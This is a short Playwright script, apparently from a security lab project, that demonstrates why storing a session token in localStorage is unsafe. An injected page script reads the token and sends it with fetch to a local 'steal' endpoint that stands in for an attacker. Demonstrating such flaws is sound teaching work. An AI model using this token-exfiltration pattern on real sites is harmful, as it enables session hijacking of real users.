// demo0/storage-xss.mjs — hole 5: a session kept in localStorage is readable by ANY script on the page.
// Usage: node demo0/storage-xss.mjs <session-id>    (needs src/server.js on :4800 and demo0/evil.js on :4801)
import { chromium } from 'playwright';
const sid = process.argv[2];
const browser = await chromium.launch();
const page = await browser.newPage();
await page.goto('http://localhost:4800/me'); // any page of LabFlow ID's origin
// What a front end must do with hole 5: the browser will not send x-session by itself, so the app keeps it in JS.
await page.evaluate((s) => localStorage.setItem('labflow.session', s), sid);
// One injected script (an XSS, a compromised npm package, a bad browser extension) is enough:
const sent = await page.evaluate(async () => {
  const s = localStorage.getItem('labflow.session');
  await fetch('http://127.0.0.1:4801/steal?s=' + s);
  return s;
});
console.log('injected script read and sent:', sent);
await browser.close();
